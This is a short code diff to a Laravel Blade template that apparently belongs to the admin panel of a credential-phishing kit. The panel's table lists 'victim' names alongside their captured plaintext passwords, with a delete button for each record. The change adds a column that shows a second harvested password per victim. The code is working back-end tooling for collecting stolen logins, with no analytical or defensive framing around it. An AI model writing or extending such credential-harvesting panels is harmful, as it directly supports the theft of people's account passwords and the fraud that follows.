@@ -15,6 +15,7 @@
                     <th>ID</th>
                     <th>Name</th>
                     <th>password</th>
+                    <th>password Two</th>
                     <th>Date</th>
                     <th>Delete</th>
                   </tr>
@@ -23,10 +24,11 @@
                         <td>{{ $data->id }}</td>
                         <td>{{ $data->victim_name }}</td>
                         <td>{{ $data->password }}</td>
+                        <td>{{ $data->password_2 }}</td>
                         <td>{{ $data->created_at->diffForHumans() }}</td>
                         <td><a href="{{ route('victim-delete',$data->id) }}" class="btn btn-danger">Delete</a></td>
                       </tr>
-                    @endforeach                  
+                    @endforeach
                 </table>
               </div>
           </div>
